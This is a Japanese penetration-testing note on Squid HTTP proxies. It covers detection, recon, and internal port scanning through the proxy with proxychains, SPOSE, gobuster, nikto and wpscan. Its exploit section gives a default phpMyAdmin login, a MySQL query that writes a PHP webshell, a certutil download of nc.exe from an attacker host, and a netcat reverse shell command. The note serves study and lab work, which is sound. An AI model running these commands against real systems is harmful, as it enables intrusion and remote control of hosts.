# Squid とは

- キャッシュ・フォワーディング型のHTTP Webプロキシ
- HTTP, FTP, DNS, SSL/TLS/HTTPSのプロキシ・キャッシュ機能を持つ
- SOCKSプロトコルは非対応（Privoxyと組み合わせることで対応可能）
- プロキシ経由で内部ネットワークへのアクセスが可能なため、**内部ポートスキャンの踏み台**として悪用されることがある
- デフォルトポート： HTTP Proxy 3128

---

# Squidが使われているときの出力

nmap結果でポート3128が`http-proxy`として検出された場合、Squidが動いている可能性が高い。  
また、ポート80が開いているにもかかわらず直接アクセスすると`403 Forbidden`が返る場合、プロキシ経由でのアクセスが必要なサインである。
```sh
PORT     STATE  SERVICE    VERSION
3128/tcp open   http-proxy Squid http proxy 4.11
```

---

>[!Info]
>以下、`<squid_IP>` はSquidが動作しているIPを指し、`<target_IP>` はsquid 経由でアクセスしたいIP（多くは内部NWのインターフェース）を指している。

# 接続

## curlでプロキシ経由アクセス

```zsh
curl --proxy http://<squid_IP>:3128 http://<target_IP>
```

## ブラウザ（FoxyProxy等）でプロキシ設定

FirefoxのFoxyProxy等でSquidのIPとポート3128を指定する。  
認証が必要な場合はユーザー名・パスワードも設定する。

![](../../Images/Pasted%20image%2020260220195415.png)

$$FoxyProxy設定例$$

---

# Recon

バージョン確認
```zsh
# nmapによるバージョン検出
nmap -sV -p 3128 <target_IP>

# curlでヘッダ確認
curl -I http://<target_IP>:3128
```

匿名アクセス確認（認証なしで通るか）
```zsh
curl --proxy http://<squid_IP>:3128 http://<target_IP>
```
- 200が返れば匿名アクセスが有効
- 407が返ればプロキシ認証が必要

---

# Enumeration

## プロキシ経由での内部ポートスキャン

### proxychainsを使う方法

`/etc/proxychains4.conf`の末尾に以下を追記
```sh
# socks4 	127.0.0.1 9050
http <squid_IP> 3128
```

認証が必要な場合は末尾にユーザー名・パスワードも追記
```sh
http <squid_IP> 3128 <username> <password>
```

proxychainsからnmapを実行
```sh
# 全ポートスキャン
ports=$(sudo proxychains nmap -sT -Pn <target_IP> -p- -n --min-rate=1000 | grep '^[0-9]' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')

# 詳細スキャン
sudo proxychains nmap -sT -Pn <target_IP> -p $ports -n -A -sV -oN Nmap/scan_via_proxy.nmap
```

>[!TIP]
>アクセスできる内部NW インターフェースを探し当てるため、[Nmap Live Host Discovery](../../Misc/Nmap%20Live%20Host%20Discovery.md)を実施する（ただし、たとえばHTTPがopenになっていてもブラウザでアクセスできないことがあるので、実際にアクセスできるかどうかは確認が必要）

>[!WARNING] 注意
> - proxychains.confの デフォルト設定である `socks4 127.0.0.1 9050` は コメントアウトすること
> - プロキシ（Squid/SOCKS）は UDP・ ICMP（ping）を通さないため、nmapがホストを「Down」と誤認するのを防ぐ目的で `TCP Connect Scan (-sT)` と `-Pn`が必須
> - squidはアプリケーション層までのアクセスが可能であるため、FTPやHTTPなどのプロトコルしかスキャンできないうえ、ACLでアクセスできるサービスを制限している可能性があるので、**squid経由のポートスキャンは信頼性が低い**

### SPOSE Scanner

認証なしのときのみ使用可能

🔗[spose.py](https://github.com/aancw/spose)を使ったSquid経由のポートスキャン
```zsh
python3 spose.py --proxy http://<squid_IP>:3128 --target <target_IP>
```
- 関連ノート：[Python Package Management (pip)](../../Misc/コンパイル・ビルド.md#Python%20Package%20Management%20(pip))

## 各ツールのプロキシ対応オプション

curl
```sh
curl -v --proxy http://<squid_IP>:3128 [-U <username>:<password>] http://<target_IP>
```

Gobuster
```zsh
gobuster dir -u http://<target_IP|Domain>:<Port>/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o gobuster.txt -x '<extensions>' --proxy http://<squid_IP>:3128
```

Nikto
```zsh
nikto -h <target_IP> -useproxy http://<squid_IP>:3128
```

WPScan
```zsh
wpscan --url http://<target_IP>/wordpress --wp-content-dir wp-content --proxy http://<squid_IP>:3128
```

---

# Exploit

## プロキシ経由での隠れたポートへのアクセス

Squidプロキシが動いているターゲットでは、直接アクセスできない内部ポートが存在することがある。  
[SPOSE Scanner](#SPOSE%20Scanner) などでスキャンして開いているポートを特定し、ブラウザのプロキシ設定経由でアクセスする。

典型的な攻撃フロー：
1. SPOSEで内部ポートスキャン → 例：8080が開いていることを確認
2. FoxyProxy等でプロキシ設定（`<squid_IP>:3128`）
3. ブラウザで `http://<target_IP>:8080` にアクセス → 内部サービスが見える
4. 内部サービス（phpMyAdmin、wamp等）を調査し、さらなる侵入経路を探す

## MySQL/phpMyAdmin経由でのRCE（Windowsの場合）

内部にwamp/phpMyAdminが見つかった場合、デフォルト認証を試みる
```
root : (空パスワード)
```

ログイン後、MySQLクエリでWebShellを書き込む
```sql
select '<?php system($_GET["cmd"]); ?>' into outfile 'C:/wamp/www/shell.php';
```

WebShell確認
```
http://<target_IP>:8080/shell.php?cmd=whoami
```

リバースシェル取得（certutilでnc.exeをダウンロード）
```powershell
certutil -urlcache -f http://<AttackerIP>:8000/nc.exe nc.exe
```
```powershell
nc.exe <AttackerIP> 443 -e cmd.exe
```

---

# 参考：Squid設定ファイルの見方

設定ファイルパス: `/etc/squid3/squid.conf`

主要なディレクティブ
```sh
# リスニングポート
http_port 3128

# アクセス制御（例：192.168.1.0/24のみ許可）
acl lan src 192.168.1.0/24
http_access allow lan

# X-Forwarded-Forヘッダの制御
forwarded_for off   # クライアントIPを隠す
forwarded_for on    # クライアントIPをX-Forwarded-Forに付与
```
`forwarded_for off`が設定されている場合、プロキシ越しでもクライアントIPが漏洩しない。  
`forwarded_for on`が設定されている場合は`X-Forwarded-For: <client_IP>`がリクエストに付与される。